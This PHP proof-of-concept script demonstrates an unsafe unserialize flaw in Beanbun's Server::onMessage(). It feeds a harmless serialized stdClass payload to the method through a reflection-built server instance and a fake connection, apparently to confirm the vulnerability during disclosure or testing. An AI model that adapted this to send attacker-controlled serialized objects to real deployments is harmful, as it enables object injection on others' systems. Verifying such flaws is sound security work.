<?php
/*
 * Beanbun Server::onMessage() unsafe unserialize PoC.
 * This invokes the original vulnerable Server.php method without starting a
 * Workerman listener. In a real deployment, the same payload is attacker-
 * controlled TCP frame data reaching onMessage($connection, $buffer).
 */
require __DIR__ . '/Server.php';

class FakeConnection {
    public function close($message) {
        echo "connection closed with: " . $message . PHP_EOL;
        return $message;
    }
    public function send($message) {
        echo "connection sent: " . $message . PHP_EOL;
        return $message;
    }
}

$payload = 'O:8:"stdClass":0:{}';
echo "[+] Sending serialized stdClass payload to Beanbun\\Lib\\Server::onMessage()" . PHP_EOL;
echo "[+] Payload: " . $payload . PHP_EOL;

$reflection = new ReflectionClass('Beanbun\\Lib\\Server');
$server = $reflection->newInstanceWithoutConstructor();
$server->onMessage(new FakeConnection(), $payload);

echo "[-] Unexpected: vulnerable method returned normally." . PHP_EOL;
exit(2);
